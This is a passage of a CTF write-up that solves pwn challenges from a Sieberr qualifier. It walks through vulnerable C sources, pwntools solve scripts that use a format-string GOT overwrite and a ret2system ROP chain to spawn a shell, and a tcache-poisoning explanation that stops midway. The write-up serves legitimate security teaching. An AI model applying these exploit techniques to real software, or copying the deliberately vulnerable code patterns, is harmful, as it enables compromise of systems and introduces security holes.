            <span class="hljs-built_in">puts</span>(GOODBYE_MSG);
            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
            <span class="hljs-keyword">if</span> (logged_in)
            {
                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome admin! The flag is sctf{fake_flag_really_fake}&quot;</span>);
            }
            <span class="hljs-keyword">else</span>
            {
                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Not authenticated&quot;</span>);
            }
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:
            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choice.&quot;</span>);
        }
    }

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>Entering the given username gives you a fake flag.</p>
<h3 id="vulnerability"tabindex="-1">Vulnerability</h3>
<pre class="hljs"><code><span class="hljs-type">void</span> <span class="hljs-title function_">login</span><span class="hljs-params">()</span>
{
    <span class="hljs-type">char</span> username[<span class="hljs-number">100</span>];
    FILE *<span class="hljs-built_in">log</span> = fopen(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>); <span class="hljs-comment">// real log</span>

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter your username: &quot;</span>);
    fgets(username, <span class="hljs-keyword">sizeof</span>(username), <span class="hljs-built_in">stdin</span>);
    username[<span class="hljs-built_in">strcspn</span>(username, <span class="hljs-string">&quot;\n&quot;</span>)] = <span class="hljs-number">0</span>;

    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(username, <span class="hljs-string">&quot;skibidiadmin123&quot;</span>) == <span class="hljs-number">0</span>)
    {
        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Access granted.&quot;</span>);
        logged_in = <span class="hljs-number">1</span>;
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Access denied, suspicious activity will be logged!&quot;</span>);
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">log</span>, username);
    }

    fclose(<span class="hljs-built_in">log</span>);
}
</code></pre>
<p>When your username is wrong, <code>fprintf(log, username)</code> is interestingly called with no format string, but only our user-controlled username buffer.</p>
<p>Looking at the manpage for <code>fprintf</code>, we can see that it formats a string and writes it to a file opened by <code>fopen</code></p>
<pre class="hljs"><code>printf(3)                                           Library Functions Manual                                           printf(3)

NAME
       printf,  fprintf, dprintf, sprintf, snprintf, vprintf, vfprintf, vdprintf, vsprintf, vsnprintf - formatted output conver‐
       sion

LIBRARY
       Standard C library (libc, -lc)

SYNOPSIS
       #include &lt;stdio.h&gt;

       int printf(const char *restrict format, ...);
       int fprintf(FILE *restrict stream,
                   const char *restrict format, ...);
DESCRIPTION
       The functions in the printf() family produce output according to a format as described below.  The functions printf() and
       vprintf() write output to stdout, the standard output stream; fprintf() and vfprintf() write output to the  given  output
       stream; sprintf(), snprintf(), vsprintf(), and vsnprintf() write to the character string str.

       The function dprintf() is the same as fprintf() except that it outputs to a file descriptor, fd, instead of to a stdio(3)
       stream.
</code></pre>
<p>As formatted output is written to a file descriptor that may not necessarily be <code>stdout</code> (in this case <code>/dev/null</code>), we have no leak primitive, but we still have a arbitrary write primitive.</p>
<h3 id="exploit"tabindex="-1">Exploit</h3>
<p>In order to perform our writes, we must first find the stack offset our username buffer lies on. Let us first modify <code>main.c</code> to write to a file we can read:</p>
<pre class="hljs"><code><span class="hljs-comment">// gcc -o main main.c -no-pie</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-type">char</span> WELCOME_MSG[] = <span class="hljs-string">&quot;Welcome to SecureLogin 3000™&quot;</span>;
<span class="hljs-type">char</span> GOODBYE_MSG[] = <span class="hljs-string">&quot;Thank you for using SecureLogin 3000™&quot;</span>;

<span class="hljs-type">int</span> logged_in = <span class="hljs-number">0</span>;

<span class="hljs-type">void</span> <span class="hljs-title function_">login</span><span class="hljs-params">()</span>
{
    <span class="hljs-type">char</span> username[<span class="hljs-number">100</span>];
    FILE *<span class="hljs-built_in">log</span> = fopen(<span class="hljs-string">&quot;./text&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>); <span class="hljs-comment">// real log</span>

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter your username: &quot;</span>);
    fgets(username, <span class="hljs-keyword">sizeof</span>(username), <span class="hljs-built_in">stdin</span>);
    username[<span class="hljs-built_in">strcspn</span>(username, <span class="hljs-string">&quot;\n&quot;</span>)] = <span class="hljs-number">0</span>;

    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(username, <span class="hljs-string">&quot;skibidiadmin123&quot;</span>) == <span class="hljs-number">0</span>)
    {
        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Access granted.&quot;</span>);
        logged_in = <span class="hljs-number">1</span>;
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Access denied, suspicious activity will be logged!&quot;</span>);
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">log</span>, username);
    }

    fclose(<span class="hljs-built_in">log</span>);
}

</code></pre>
<p>and then craft a <code>fuzz.py</code> to fuzz stack offsets:</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

elf = context.binary = ELF(<span class="hljs-string">&quot;./test&quot;</span>)
context.log_level = <span class="hljs-string">&#x27;error&#x27;</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">101</span>):
    <span class="hljs-keyword">try</span>:
        p = process()

        p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)
        p.sendlineafter(<span class="hljs-string">b&#x27;username: &#x27;</span>, <span class="hljs-string">&#x27;AAAA%{}$p&#x27;</span>.<span class="hljs-built_in">format</span>(i).encode())

        p.recvline()
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./text&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:
            resp = f.read().strip()

        <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./text&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).close() <span class="hljs-comment"># clear file contents</span>

        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;: &#x27;</span> + resp)
        p.close()

    <span class="hljs-keyword">except</span> EOFError:
        <span class="hljs-keyword">pass</span>
</code></pre>
<p>Examining the output list, we can then find the stack offset where our buffer lives:</p>
<pre class="hljs"><code>1: AAAA0x7ffc23e9c3f0
2: AAAA0x7f8485c227d0
3: AAAA0xa
4: AAAA(nil)
5: AAAA0x7024352541414141
6: AAAA(nil)
7: AAAA0x7ffd42538140
8: AAAA0x7f7a477fe914
9: AAAA0x7fe73210d5c0
10: AAAA0x1e
11: AAAA0x1e
12: AAAA0xa
13: AAAA0x7ffe38851c70
14: AAAA0x7f48906d686a
15: AAAA(nil)
16: AAAA0x4030a0
17: AAAA(nil)
18: AAAA0x3aa6d2a0
19: AAAA0x7ffe4c5e8700
20: AAAA0x40068b
21: AAAA0x34268
22: AAAA0x100000000
23: AAAA0x7ffccd0ba700
24: AAAA0x7f262a5f05f5
</code></pre>
<h3 id="write-what-to-where%3F"tabindex="-1">Write What to Where?</h3>
<p>Looking at the binary protections, Partial Relro is enabled, hinting at a GOT overwrite attack. However, we can’t write our win function to just any GOT entry because it requires the argument to be a pointer to <code>&quot;/bin/sh&quot;</code>.</p>
<p>Even so, if we were able to write <code>&quot;/bin/sh&quot;</code> to a memory region within the binary that would be passed into the first argument of a libc function, we can then write our win function to the GOT entry of that libc function to get our shell.</p>
<p>Looking at the program source again, there is one location in which a libc function is called on a pointer to a region in memory:</p>
<pre class="hljs"><code>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
            <span class="hljs-built_in">puts</span>(GOODBYE_MSG);
            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
            <span class="hljs-keyword">break</span>;
</code></pre>
<p>Looking in GDB, it turns out that <code>GOODBYE_MSG</code> actually lives in a writable section of the binary:</p>
<pre class="hljs"><code>gef&gt; base
----------------------------------------------------------- code base -----------------------------------------------------------
$codebase = 0x400000
$binbase = 0x400000
------------------------------------------------------------- .text -------------------------------------------------------------
$text = 0x401100
------------------------------------------------------------ .rodata ------------------------------------------------------------
$rodata = 0x402000
------------------------------------------------------------- .data -------------------------------------------------------------
$data = 0x404080
------------------------------------------------------------- .bss -------------------------------------------------------------
$bss = 0x404100
gef&gt; x/40gx $data
0x404080:	0x0000000000000000	0x0000000000000000
0x404090:	0x0000000000000000	0x0000000000000000
0x4040a0 &lt;WELCOME_MSG&gt;:	0x20656d6f636c6557	0x7275636553206f74
0x4040b0 &lt;WELCOME_MSG+16&gt;:	0x33206e69676f4c65	0x0000a284e2303030
0x4040c0 &lt;GOODBYE_MSG&gt;:	0x6f79206b6e616854	0x737520726f662075
0x4040d0 &lt;GOODBYE_MSG+16&gt;:	0x7563655320676e69	0x206e69676f4c6572
0x4040e0 &lt;GOODBYE_MSG+32&gt;:	0x00a284e230303033	0x0000000000000000
0x4040f0:	0x0000000000000000	0x0000000000000000
0x404100 &lt;stdout@GLIBC_2.2.5&gt;:	0x00007ffff7fa25c0	0x0000000000000000
0x404110 &lt;stdin@GLIBC_2.2.5&gt;:	0x00007ffff7fa18e0	0x0000000000000000
0x404120 &lt;stderr@GLIBC_2.2.5&gt;:	0x00007ffff7fa24e0	0x0000000000000000
0x404130:	0x0000000000000000	0x0000000000000000
0x404140:	0x0000000000000000	0x0000000000000000
0x404150:	0x0000000000000000	0x0000000000000000
0x404160:	0x0000000000000000	0x0000000000000000
0x404170:	0x0000000000000000	0x0000000000000000
0x404180:	0x0000000000000000	0x0000000000000000
0x404190:	0x0000000000000000	0x0000000000000000
0x4041a0:	0x0000000000000000	0x0000000000000000
0x4041b0:	0x0000000000000000	0x0000000000000000
gef&gt; vmmap 0x4040c0
[ Legend: Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x0000000000404000 0x0000000000405000 0x0000000000001000 0x0000000000003000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/securelogin/main +0xc0
gef&gt;
</code></pre>
<p>Hence, we can write our <code>/bin/sh</code> string to <code>GOODBYE_MSG</code>, and <code>gurt</code> to the <code>puts</code> GOT entry in the binary, before selecting option 2 to get our shell.</p>
<h3 id="full-solve-script-2"tabindex="-1">Full solve script</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

elf = context.binary = ELF(<span class="hljs-string">&quot;./main&quot;</span>)
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
context.terminal = <span class="hljs-string">&#x27;kitty&#x27;</span>

<span class="hljs-comment"># p = process()</span>
<span class="hljs-comment"># gdb.attach(p)</span>
p = remote(<span class="hljs-string">&#x27;chal2.sieberr.live&#x27;</span>, <span class="hljs-number">15003</span>)

p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)
payload = fmtstr_payload(<span class="hljs-number">5</span>, {<span class="hljs-number">0x4040c0</span>: <span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>}, write_size=<span class="hljs-string">&#x27;short&#x27;</span>)
p.sendlineafter(<span class="hljs-string">b&#x27;Enter your username: &#x27;</span>, payload)

p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)
payload = fmtstr_payload(<span class="hljs-number">5</span>, {elf.got.puts: elf.sym.gurt}, write_size=<span class="hljs-string">&#x27;short&#x27;</span>)
p.sendlineafter(<span class="hljs-string">b&#x27;Enter your username: &#x27;</span>, payload)

p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)
p.interactive()
</code></pre>
<h2 id="bearings-check"tabindex="-1">Bearings Check</h2>
<blockquote>
<p>Every pwner has had to gain their bearings at least once. Can you gain yours?</p>
<p><strong>author</strong>: whywhy</p>
<p><strong>solves</strong>: 19</p>
</blockquote>
<h3 id="challenge-protections-3"tabindex="-1">Challenge Protections</h3>
<pre class="hljs"><code>[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/bearings/chal_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
</code></pre>
<p>The challenge initialises a struct in the stack containing a <code>char name[32]</code> buffer, a <code>void* main_ref</code> pointer to <code>main</code>, a <code>char pad[8]</code> buffer, and a <code>char vuln[32]</code> buffer.</p>
<p>The user is allowed to read 32 bytes into the name buffer, but is then allowed a buffer overflow of 2048 - 32 bytes into the vuln buffer.</p>
<p>There is a <code>gift</code> function not called anywhere, containing a <code>pop rdi; ret</code> gadget as well as a <code>system</code> call.</p>
<p>A <code>/bin/sh</code> string is initialised as <code>static char</code>, and hence lives in the BSS/.data region.</p>
<p>PIE is enabled, hence we will need an info leak in order to use gadgets or functions in the binary.</p>
<pre class="hljs"><code><span class="hljs-comment">// gcc -o chal chal.c -Wl,-z,relro,-z,now -fpie -pie</span>

<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proving_ground</span> {</span>
    <span class="hljs-type">char</span> name[<span class="hljs-number">32</span>];
    <span class="hljs-type">void</span>* main_ref;
    <span class="hljs-type">char</span> pad[<span class="hljs-number">8</span>];
    <span class="hljs-type">char</span> vuln[<span class="hljs-number">32</span>];
};

<span class="hljs-type">void</span> <span class="hljs-title function_">gifts</span><span class="hljs-params">()</span> {
    <span class="hljs-type">static</span> <span class="hljs-type">char</span> gift[<span class="hljs-number">8</span>] = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>;
    __asm__(
        <span class="hljs-string">&quot;pop %rdi;&quot;</span>
        <span class="hljs-string">&quot;ret;&quot;</span>
    );
    system(<span class="hljs-string">&quot;echo You&#x27;re going to need to try harder than this...&quot;</span>);
}

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);
    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proving_ground</span> <span class="hljs-title">field</span>;</span>
    <span class="hljs-built_in">strncpy</span>(field.pad, <span class="hljs-string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span>, <span class="hljs-number">8</span>);
    field.main_ref = &amp;main;
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;To become a pwner, you must first know how to gain your bearings. &quot;</span>);
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Time to prove yourself! &quot;</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Let&#x27;s start slow. What is your name? \n&gt; &quot;</span>);
    read(<span class="hljs-number">0</span>, field.name, <span class="hljs-number">32</span>);
    getchar();
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Very well, %s. Now, let&#x27;s see what you&#x27;ve got! \n&gt; &quot;</span>, field.name);
    read(<span class="hljs-number">0</span>, field.vuln, <span class="hljs-number">2048</span>);
    getchar();
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I hope that worked out for you...&quot;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

</code></pre>
<h3 id="info-leak"tabindex="-1">Info Leak</h3>
<p>In order to defeat PIE, we first need an info leak of an address that lives in the binary.</p>
<p>In <code>main</code>:</p>
<pre class="hljs"><code>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Let&#x27;s start slow. What is your name? \n&gt; &quot;</span>);
    read(<span class="hljs-number">0</span>, field.name, <span class="hljs-number">32</span>);
    getchar();
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Very well, %s. Now, let&#x27;s see what you&#x27;ve got! \n&gt; &quot;</span>, field.name);
</code></pre>
<p><code>field.name</code> is 32 bytes long and 16 bytes aligned within the <code>proving_ground</code> struct. Hence, it is also directly adjacent to <code>field.main_ref</code>, which contains a pointer to <code>main</code>.</p>
<p>The <code>%s</code> format specifier in <code>printf</code> only stops printing from a <code>char</code> buffer when it reaches a null byte, so we can attain an info leak by filling <code>field.name</code> with 32 non-null bytes, and then receiving 6 bytes of the address of <code>main</code> to attain our info leak:</p>
<pre class="hljs"><code>p.sendafter(<span class="hljs-string">b&#x27;name? \n&gt; &#x27;</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">32</span>)
p.send(<span class="hljs-string">b&#x27;\n&#x27;</span>)
p.recvuntil(<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">32</span>)
elf.address = u64(p.recv(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">2</span>) - elf.sym.main
log.info(<span class="hljs-string">&quot;elf.address, %#x&quot;</span>, elf.address)
</code></pre>
<h3 id="ret2system%40plt"tabindex="-1">ret2system@plt</h3>
<p>We can now utilise the large buffer overflow in <code>field.vuln</code> to overwrite the return address and stack with our exploit ROP chain.</p>
<p>As <code>system</code> is available through the .plt stub <code>system@plt</code> within the binary, it is possible to call <code>system</code> with our ROP chain on the <code>/bin/sh</code> string that lives within the BSS/.data.</p>
<h3 id="full-solve-script-3"tabindex="-1">Full solve script</h3>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>

<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

elf = ELF(<span class="hljs-string">&quot;./chal_patched&quot;</span>)
libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)
ld = ELF(<span class="hljs-string">&quot;./ld-linux-x86-64.so.2&quot;</span>)

context.binary = elf
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
context.terminal = <span class="hljs-string">&#x27;kitty&#x27;</span>

<span class="hljs-comment"># p = process()</span>
<span class="hljs-comment"># gdb.attach(p)</span>
p = remote(<span class="hljs-string">&#x27;chal2.sieberr.live&#x27;</span>, <span class="hljs-number">15001</span>)

p.sendafter(<span class="hljs-string">b&#x27;name? \n&gt; &#x27;</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">32</span>)
p.send(<span class="hljs-string">b&#x27;\n&#x27;</span>)
p.recvuntil(<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">32</span>)
elf.address = u64(p.recv(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">2</span>) - elf.sym.main
log.info(<span class="hljs-string">&quot;elf.address, %#x&quot;</span>, elf.address)

rop = ROP(elf)
rop.raw(<span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x58</span> - <span class="hljs-number">6</span>*<span class="hljs-number">8</span>))
rop.raw(rop.ret[<span class="hljs-number">0</span>])
rop.system(<span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>)))

<span class="hljs-built_in">print</span>(rop.dump())

p.sendafter(<span class="hljs-string">b&#x27;\n&gt; &#x27;</span>, rop.chain())

p.interactive()
</code></pre>
<h2 id="leaky-heap"tabindex="-1">Leaky Heap</h2>
<blockquote>
<p>waiter waiter! my leak has a heap!</p>
<p><strong>author</strong>: whywhy</p>
<p><strong>solves</strong>: 9</p>
</blockquote>
<h3 id="challenge-protections-4"tabindex="-1">Challenge Protections</h3>
<pre class="hljs"><code>[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/leakyheap/chal_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    Stripped:   No
</code></pre>
<p>The challenge is a heap exploitation challenge that exposes malloc, free, and write functionalities. When selected, there is also a “sanity check” that checks if a <code>pigs_flying</code> variable in the BSS is 1, calling <code>system(&quot;cat flag.txt&quot;)</code> if it is. Writing ‘\x01’ to the variable is thus the target of the challenge.</p>
<pre class="hljs"><code><span class="hljs-comment">// gcc -o chal chal.c -Wl,-z,relro,-z,now -fno-pie -no-pie</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> ALLOC_SIZE 32</span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    setbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>);
    setbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>);
    <span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> pigs_flying = <span class="hljs-number">0</span>;
    <span class="hljs-type">char</span>* chunks[<span class="hljs-number">16</span>] = {<span class="hljs-literal">NULL</span>};
    <span class="hljs-type">int</span> choice = <span class="hljs-number">0</span>;
    <span class="hljs-type">int</span> idx = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);
        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;choice);
        <span class="hljs-keyword">switch</span> (choice) {
            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">goto</span> sanity_check;
            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: 
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);
                <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;idx);
                <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-number">16</span>) <span class="hljs-keyword">break</span>;
                chunks[idx] = <span class="hljs-built_in">malloc</span>(ALLOC_SIZE);
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the tap drips: %p\n&quot;</span>, chunks[idx]);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: 
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);
                <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;idx);
                <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-number">16</span>) <span class="hljs-keyword">break</span>;
                <span class="hljs-built_in">free</span>(chunks[idx]);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);
                <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;idx);
                <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-number">16</span> || chunks[idx]==<span class="hljs-literal">NULL</span>) <span class="hljs-keyword">break</span>;
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);
                <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%31s&quot;</span>, chunks[idx]);
                <span class="hljs-keyword">break</span>;
        }
    }

sanity_check:
    <span class="hljs-keyword">if</span> (pigs_flying == <span class="hljs-number">1</span>) {
        system(<span class="hljs-string">&quot;cat flag.txt&quot;</span>);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;huh? everything seems to be in place...\n&quot;</span>);
    }
    _exit(<span class="hljs-number">0</span>);
}
</code></pre>
<h3 id="vulnerability-1"tabindex="-1">Vulnerability</h3>
<p>The challenge has a Use-After-Free (UAF) vulnerability that allows the user to write to the chunk even after freeing. Furhermore, the <code>malloc</code> functionality prints the address of each chunk, giving us a free heap leak.</p>
<p>This thus points at a tcache poisoning attack.</p>
<h4 id="tcache-poisoning"tabindex="-1">Tcache Poisoning</h4>
<p>Tcache poisoning is a technique that refers to hijacking the tcache free list to enable arbitrary allocation primitives. This can thus enable arbitrary read/write primitives, which could then be used to achieve code execution.</p>
<p>In this case, we need an arbitrary write primitive to write <code>\x01</code> to <code>pigs_flying</code>.</p>
<p>The tcache freelist operates on a Last-In-First-Out (LIFO) linked list data structure. When <code>malloc</code> is called, it first looks in the tcache for chunks that could service the request.</p>
<pre class="hljs"><code>head ------&gt; 0x404810 ------&gt; 0x404830 ------&gt; 0x404850 ------&gt; NULL
count: 3
</code></pre>
<p>When a freed chunk is sent to the tcache, the chunk takes the form of the following struct:</p>
<pre class="hljs"><code><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span>
{</span>
  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span>
  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span>
} tcache_entry;
</code></pre>
<p>A tcache poisoning attack involves using a UAF primitive to be able to write and modify the <code>tcache_entry *next</code> pointer of the freed chunk in order to hijack the freelist:</p>
<pre class="hljs"><code>head ------&gt; 0x404810 ------&gt; EVIL 
</code></pre>
<p>However, we must note another protection at play.</p>
<h4 id="tcache-safelinking-(glibc-2.32%3C)"tabindex="-1">Tcache Safelinking (GLIBC 2.32&lt;)</h4>
<p>Since GLIBC 2.32, the libc uses a form of protection for singly-linked lists in the free bins known as <strong>safe-linking</strong>. This involves protecting the <code>tcache_entry *next</code> pointer with pointer mangling through the following formula:</p>
<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span>
</code></pre>
<p>In essence, if a freed chunk lives at:</p>
<pre class="hljs"><code>0x404810: 0x0000000000404830
</code></pre>
<p>Then safelinking encrypts the <code>*next</code> pointer through <code>(0x404810 &gt;&gt; 12) ^ 0x404830 = 0x404 ^ 0x404830</code>.</p>
<p>This requires an extra heap leak, and thus another info leak, to enable tcache poisoning by forging a correctly encrypted <code>*next</code> pointer.</p>
<h3 id="exploitation"tabindex="-1">Exploitation</h3>
<p>Since the program gives us a free heap leak, we can bypass safe-linking to do tcache poisoning and arballocate to <code>pigs_flying</code>. We will first allocate two chunks:</p>
<pre class="hljs"><code>chunks = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">idx</span>):
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())
    p.recvuntil(<span class="hljs-string">b&#x27;drips: &#x27;</span>)
    chunks[idx] = <span class="hljs-built_in">int</span>(p.recvline().strip(), <span class="hljs-number">16</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())

<span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">idx, content</span>):
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())
    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, content)

